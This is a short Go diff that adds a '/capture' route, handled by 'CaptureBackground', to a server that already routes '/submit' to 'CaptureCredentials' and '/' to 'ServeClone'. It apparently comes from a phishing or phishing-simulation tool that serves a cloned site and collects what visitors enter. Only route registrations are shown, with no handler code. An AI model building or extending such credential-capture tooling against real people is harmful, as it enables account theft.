@@ -37,6 +37,7 @@ func (s *Server) Start(ctx context.Context) error {
 
 	mux := http.NewServeMux()
 	mux.HandleFunc("/submit", h.CaptureCredentials)
+	mux.HandleFunc("/capture", h.CaptureBackground)
 	mux.HandleFunc("/", h.ServeClone)
 
 	srv := &http.Server{
